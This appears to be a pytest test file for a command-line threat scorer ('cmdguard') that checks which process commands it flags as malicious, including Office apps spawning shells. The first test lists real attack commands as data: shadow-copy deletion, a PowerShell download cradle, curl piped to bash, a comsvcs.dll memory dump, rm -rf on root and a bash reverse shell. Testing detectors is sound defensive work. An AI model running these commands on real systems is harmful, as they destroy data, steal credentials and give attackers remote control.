"""Terminal-command guard."""
import cmdguard


def _v(cmd, name="powershell.exe", parent="explorer.exe", exe=""):
    return cmdguard.score({"pid": 4242, "name": name, "parent": parent, "cmd": cmd, "exe": exe})


def test_dangerous_commands_are_malicious():
    for name, cmd in [
        ("cmd.exe", "cmd /c vssadmin delete shadows /all /quiet"),
        ("powershell.exe", "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')\""),
        ("bash", "curl -s http://198.51.100.9/x.sh | bash"),
        ("rundll32.exe", "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 612 C:\\t\\l.dmp full"),
        ("bash", "rm -rf --no-preserve-root /"),
        ("bash", "bash -i >& /dev/tcp/203.0.113.4/4444 0>&1"),
    ]:
        r = _v(cmd, name)
        assert r["verdict"] == "malicious", (cmd, r)


def test_everyday_commands_are_ok():
    for name, cmd in [("cmd.exe", "cmd /c dir C:\\Users"), ("powershell.exe", "powershell Get-Process | Sort CPU"), ("bash", "ls -la /home/user"),
                      ("curl", "curl -s https://api.github.com/repos/x/y"), ("python3", "python3 manage.py runserver"), ("git", "git status"),
                      ("ipconfig", "ipconfig /all"), ("bash", "chmod +x ./build.sh"), ("net.exe", "net use Z: \\\\fileserver\\share")]:
        assert _v(cmd, name)["verdict"] == "ok", (cmd, _v(cmd, name))


def test_office_starting_a_shell_is_flagged_even_with_a_plain_command():
    assert _v("cmd /c whoami", "cmd.exe", parent="WINWORD.EXE")["verdict"] in ("suspicious", "malicious")
    assert _v("cmd /c whoami", "cmd.exe", parent="explorer.exe")["verdict"] == "ok"


def test_behaviour_alone_never_creates_a_verdict(tmp_path, monkeypatch):
    cmdguard._base.clear()
    cmdguard._base.update({"programs": {"git": 900}, "hours": [1] * 24, "total": 5000})
    r = _v("echo hello", "certutil.exe", exe="C:\\Users\\a\\AppData\\Local\\Temp\\certutil.exe")
    assert r["verdict"] == "ok" and r["behaviour"]            # the signals are shown, the verdict stays ok
    cmdguard._base.clear()


def test_only_malicious_commands_recommend_a_kill_and_never_pid_4():
    out = cmdguard.scan([{"pid": 500, "name": "cmd.exe", "cmd": "vssadmin delete shadows /all"}, {"pid": 501, "name": "cmd.exe", "cmd": "dir"}, {"pid": 4, "name": "System", "cmd": "vssadmin delete shadows"}])
    assert [a["pid"] for a in out["actions"]] == [500]
